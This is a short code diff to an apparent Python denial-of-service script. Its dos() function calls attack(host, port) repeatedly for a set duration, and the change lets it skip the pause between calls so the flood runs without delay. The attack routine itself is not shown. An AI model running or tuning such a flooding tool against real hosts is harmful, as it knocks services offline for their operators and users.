@@ -1,4 +1,4 @@
-import time, socket, os, sys, string, datetime
+import time, socket, datetime
 
 message = "random"
 
@@ -7,7 +7,8 @@ def dos(host, port, duration, pause):
     finish_time = datetime.datetime.now() + datetime.timedelta(minutes=int(duration))
     while datetime.datetime.now() < finish_time:
         attack(host, port)
-        time.sleep(int(pause))
+        if int(pause) != 0:
+            time.sleep(int(pause))
     else:
         return "Success"
 
